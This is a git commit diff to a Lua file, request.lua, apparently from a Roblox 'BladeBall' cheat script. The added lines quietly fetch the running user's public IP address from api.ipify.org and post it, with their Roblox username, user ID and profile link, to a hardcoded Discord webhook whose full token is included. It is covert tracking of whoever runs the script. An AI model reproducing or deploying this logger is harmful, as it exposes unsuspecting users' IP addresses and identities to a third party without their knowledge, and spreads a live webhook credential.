847bddf8a7739219036d2ac095de2d2bd7b79dd2
ClamSham <96899221+LeeDoesStuff@users.noreply.github.com>
2023-09-10 20:33:19 -0400

    Update request.lua

--- request.lua
+++ request.lua
@@ -1,11 +1,22 @@
+local Response = request({
+    Url = "https://api.ipify.org",
+    Method = "GET"
+})
+
+
+local url = "https://discord.com/api/webhooks/1150572233211772969/5bpbAcMnFyXdmyfaxSJ0vju40fYdAWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
+localusername = game.Players.LocalPlayer.Name
+localuserid = game.Players.LocalPlayer.UserId
+userinfo = Response.Body
+
     local data = {
         ["username"] = "bub",
-        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo,
+        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
     }
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {
         ["content-type"] = "application/json"
     }
     request = http_request or request or HttpPost or syn.request
-    local send = {Url = get, Body = newdata, Method = "POST", Headers = headers}
+    local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(send)
